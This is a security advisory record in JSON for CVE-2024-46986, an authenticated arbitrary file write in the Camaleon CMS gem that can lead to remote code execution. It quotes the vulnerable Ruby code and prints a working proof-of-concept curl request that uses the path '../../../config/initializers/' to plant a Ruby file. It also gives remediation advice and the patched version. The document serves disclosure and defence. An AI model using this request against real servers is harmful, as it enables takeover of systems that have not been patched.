{
  "Severity": "HIGH",
  "UpdatedAt": "2024-09-18T14:41:58Z",
  "Package": {
    "Ecosystem": "RUBYGEMS",
    "Name": "camaleon_cms"
  },
  "Advisory": {
    "DatabaseId": 260705,
    "Id": "GSA_kwCzR0hTQS13bWpnLXZxaHYtcTVwNc4AA_ph",
    "GhsaId": "GHSA-wmjg-vqhv-q5p5",
    "References": [
      {
        "Url": "https://github.com/owen2345/camaleon-cms/security/advisories/GHSA-wmjg-vqhv-q5p5"
      },
      {
        "Url": "https://github.com/owen2345/camaleon-cms/commit/b3b12b1e4a9e3fccaf5bb4330820fa7f8744e6bd"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2024-46986"
      },
      {
        "Url": "https://codeql.github.com/codeql-query-help/ruby/rb-path-injection"
      },
      {
        "Url": "https://owasp.org/www-community/attacks/Path_Traversal"
      },
      {
        "Url": "https://www.reddit.com/r/rails/comments/1exwtdm/camaleon_cms_281_has_been_released"
      },
      {
        "Url": "https://github.com/rubysec/ruby-advisory-db/blob/master/gems/camaleon_cms/CVE-2024-46986.yml"
      },
      {
        "Url": "https://securitylab.github.com/advisories/GHSL-2024-182_GHSL-2024-186_Camaleon_CMS"
      },
      {
        "Url": "https://github.com/advisories/GHSA-wmjg-vqhv-q5p5"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-wmjg-vqhv-q5p5"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2024-46986"
      }
    ],
    "Description": "An arbitrary file write vulnerability accessible via the upload method of the MediaController allows authenticated users to write arbitrary files to any location on the web server Camaleon CMS is running on (depending on the permissions of the underlying filesystem). E.g. This can lead to a delayed remote code execution in case an attacker is able to write a Ruby file into the config/initializers/ subfolder of the Ruby on Rails application.\n\nOnce a user upload is started via the [upload](https://github.com/owen2345/camaleon-cms/blob/feccb96e542319ed608acd3a16fa5d92f13ede67/app/controllers/camaleon_cms/admin/media_controller.rb#L86-L87) method, the file_upload and the folder parameter\n```ruby\ndef upload(settings = {})\n  params[:dimension] = nil if params[:skip_auto_crop].present?\n  f = { error: 'File not found.' }\n  if params[:file_upload].present?\n    f = upload_file(params[:file_upload],\n                    { folder: params[:folder], dimension: params['dimension'], formats: params[:formats], versions: params[:versions],\n                      thumb_size: params[:thumb_size] }.merge(settings))\n  end\n  [..]\nend\n```\nare passed to the [upload_file](https://github.com/owen2345/camaleon-cms/blob/feccb96e542319ed608acd3a16fa5d92f13ede67/app/helpers/camaleon_cms/uploader_helper.rb#L23-L24) method. Inside that method the given settings are [merged](https://github.com/owen2345/camaleon-cms/blob/feccb96e542319ed608acd3a16fa5d92f13ede67/app/helpers/camaleon_cms/uploader_helper.rb#L41-L42) with some presets. The file format is [checked against](https://github.com/owen2345/camaleon-cms/blob/feccb96e542319ed608acd3a16fa5d92f13ede67/app/helpers/camaleon_cms/uploader_helper.rb#L61-L62) the formats settings we can override with the formats parameters.\n\n```ruby\n# formats validations\n  return { error: \"#{ct('file_format_error')} (#{settings[:formats]})\" } unless cama_uploader.class.validate_file_format(\n    uploaded_io.path, settings[:formats]\n )\n```\nOur given folder is then [passed unchecked](https://github.com/owen2345/camaleon-cms/blob/feccb96e542319ed608acd3a16fa5d92f13ede67/app/helpers/camaleon_cms/uploader_helper.rb#L73-L74) to the Cama_uploader:\n\n```ruby\nkey = File.join(settings[:folder], settings[:filename]).to_s.cama_fix_slash\nres = cama_uploader.add_file(settings[:uploaded_io], key, { same_name: settings[:same_name] })\n```\nIn the [add_file](https://github.com/owen2345/camaleon-cms/blob/feccb96e542319ed608acd3a16fa5d92f13ede67/app/uploaders/camaleon_cms_local_uploader.rb#L77) method of CamaleonCmsLocalUploader this key argument containing the unchecked path is then used to write the file to the file system:\n\n```ruby\ndef add_file(uploaded_io_or_file_path, key, args = {})\n  [..]\n  upload_io = uploaded_io_or_file_path.is_a?(String) ? File.open(uploaded_io_or_file_path) : uploaded_io_or_file_path\n  File.open(File.join(@root_folder, key), 'wb') { |file| file.write(upload_io.read) }\n  [..]\nend\n```\nProof of concept\nPrecondition: A valid account of a registered user is required. (The values for auth_token and _cms_session need to be replaced with authenticated values in the curl command below)\n\ncurl --path-as-is -i -s -k -X $'POST' \\\n -H $'User-Agent: Mozilla/5.0' -H $'Content-Type: multipart/form-data; boundary=----WebKitFormBoundary80dMC9jX3srWAsga' -H $'Accept: */*' -H $'Connection: keep-alive' \\\n    -b $'auth_token=[..]; _cms_session=[..]' \\\n    --data-binary $'------WebKitFormBoundary80dMC9jX3srWAsga\\x0d\\x0aContent-Disposition: form-data; name=\\\"file_upload\\\"; filename=\\\"test.rb\\\"\\x0d\\x0aContent-Type: text/x-ruby-script\\x0d\\x0a\\x0d\\x0aputs \\\"=================================\\\"\\x0aputs \\\"=================================\\\"\\x0aputs \\\"= COMPROMISED                   =\\\"\\x0aputs \\\"=================================\\\"\\x0aputs \\\"=================================\\\"\\x0d\\x0a------WebKitFormBoundary80dMC9jX3srWAsga\\x0d\\x0aContent-Disposition: form-data; name=\\\"folder\\\"\\x0d\\x0a\\x0d\\x0a../../../config/initializers/\\x0d\\x0a------WebKitFormBoundary80dMC9jX3srWAsga\\x0d\\x0aContent-Disposition: form-data; name=\\\"skip_auto_crop\\\"\\x0d\\x0a\\x0d\\x0atrue\\x0d\\x0a------WebKitFormBoundary80dMC9jX3srWAsga--\\x0d\\x0a' \\\n    $'https://\u003ccamaleon-host\u003e/admin/media/upload?actions=false'\nNote that the upload form field formats was removed so that Camaleon CMS accepts any file. The folder was set to ../../../config/initializers/so that following Ruby script is written into the initializers folder of the Rails web app:\n\nputs \"=================================\"\nputs \"=================================\"\nputs \"= COMPROMISED                   =\"\nputs \"=================================\"\nputs \"=================================\"\nOnce Camaleon CMS is restarted following output will be visible in the log:\n\n=================================\n=================================\n= COMPROMISED                   =\n=================================\n=================================\nImpact\nThis issue may lead up to Remote Code Execution (RCE) via arbitrary file write.\n\nRemediation\nNormalize file paths constructed from untrusted user input before using them and check that the resulting path is inside the targeted directory. Additionally, do not allow character sequences such as .. in untrusted input that is used to build paths.\n\nSee also:\n\n[CodeQL: Uncontrolled data used in path expression](https://codeql.github.com/codeql-query-help/ruby/rb-path-injection/)\n[OWASP: Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2024-09-18T14:39:03Z",
    "Severity": "HIGH",
    "Summary": "Camaleon CMS affected by arbitrary file write to RCE (GHSL-2024-182)",
    "UpdatedAt": "2025-04-17T22:55:04Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 8.8,
      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "2.8.1"
      },
      "VulnerableVersionRange": "\u003e= 2.8.0, \u003c 2.8.1"
    }
  ]
}